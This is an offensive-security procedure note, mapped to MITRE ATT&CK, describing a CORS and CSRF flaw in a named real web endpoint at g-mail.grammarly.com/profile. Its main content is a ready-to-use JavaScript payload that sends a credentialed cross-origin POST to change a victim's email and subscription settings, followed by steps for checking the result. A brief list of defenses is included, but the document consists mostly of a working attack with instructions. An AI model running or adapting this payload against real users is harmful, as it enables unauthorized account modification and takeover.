---
id: proc-cors-post-modify
tags:
  - account-modification
  - cors
  - csrf
  - subscription-change
type: procedure
tools: []
tactics:
  - '[[Collection]]'
commands:
  - '[[commands/javascript-post-profile-modify]]'
verified: false
platforms:
  - Web
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[Steal Web Session Cookie]]'
  - '[[Exploit Public-Facing Application]]'
updated_at: '2025-12-14T17:27:57.765Z'
skill_level: intermediate
impact_level: high
detection_risk: medium
sub_techniques: []
validated: true
mitre_tactics:
  - '[[Collection]]'
mitre_techniques:
  - '[[Steal Web Session Cookie]]'
  - '[[Exploit Public-Facing Application]]'
---
# Cross-Origin-POST-Request-for-Unauthorized-Account-Modification

## Summary

This procedure leverages injected JavaScript to send a cross-origin POST request to the /profile endpoint using FormData, exploiting missing CSRF validation to modify user settings like email or unsubscribe status while including session credentials.

## Description

Building on data theft, the JS constructs FormData with parameters (e.g., email, unsubscribe) and posts to https://g-mail.grammarly.com/profile. The endpoint accepts application/json but lacks CSRF checks, allowing changes. CORS permits the request from the spoofed origin with credentials, enabling account takeover actions.

## Requirements

1. Successful prior GET for data validation
2. Victim's session cookies intact
3. Endpoint vulnerable to POST without CSRF
4. Spoofed CORS origin active

## Defense

Defensive measures and detection strategies:

- Enforce CSRF tokens in headers for all POST requests
- Validate Content-Type strictly and reject FormData if tokens are absent
- Audit logs for unexpected profile changes
- Use same-site cookies to limit cross-origin credential inclusion

## Objectives

1. Alter subscription preferences or email
2. Demonstrate full account control
3. Highlight CSRF absence impact

## Instructions

### Step 1: Prepare and Send POST

**Context**: Use FormData to submit changes without CSRF token.

**Command** ([[commands/javascript-post-profile-modify]]):

```javascript
var xhttp = new XMLHttpRequest(); var data = new FormData(); data.append("email", "example@email.com"); data.append("unsubscribe", "false"); xhttp.open("POST", "https://g-mail.grammarly.com/profile", true); xhttp.withCredentials = true; xhttp.send(data);
```

> Posts FormData; server processes without validation due to CORS and CSRF flaws.

**Expected Output**: 200 OK with success message, e.g., updated preferences confirmed.

### Step 2: Verify Modification

**Context**: Re-run GET to confirm changes.

**Instructions**: Execute the GET command again and check for updated fields.

**Expected Output**: JSON reflects new email or unsubscribe value.

## MITRE ATT&CK Mapping

### Tactics

- [[Collection]]

### Techniques

- [[Steal Web Session Cookie]]
- [[Exploit Public-Facing Application]]

### Sub-Techniques


## Commands Used

- [[commands/javascript-post-profile-modify]]

## Tools Used


## Tags

- account-modification
- cors
- csrf
- subscription-change
